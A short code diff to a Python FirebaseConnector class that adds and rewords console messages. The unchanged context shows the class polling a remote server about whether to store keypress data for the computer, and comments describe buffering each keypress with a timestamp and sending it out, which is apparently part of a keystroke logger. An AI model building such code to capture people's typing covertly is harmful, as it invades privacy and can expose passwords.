@@ -14,6 +14,7 @@ class FirebaseConnector:
 
     # Makes a request to firebase to ask if should be storing key press data for the running computer
     def getShouldBeStoringKeypressData(self):
+        print("Connecting to Firebase Session...")
         # Fire Request
         ploads = {'secret': SECRET, 'id': COMPUTER_ID}
         r = requests.post(
@@ -22,7 +23,7 @@ class FirebaseConnector:
         # Handle request
         if(r.ok):
             self.sessionActive = r.json()["status"]
-            print("Session Active - {0}".format(self.sessionActive))
+            print("Connected, Session Active - {0}".format(self.sessionActive))
 
     # {"keyPressed":"a","timeStamp":"01-11-2021_10:05:09"}
     # Adds current keypress to buffer and calls a send
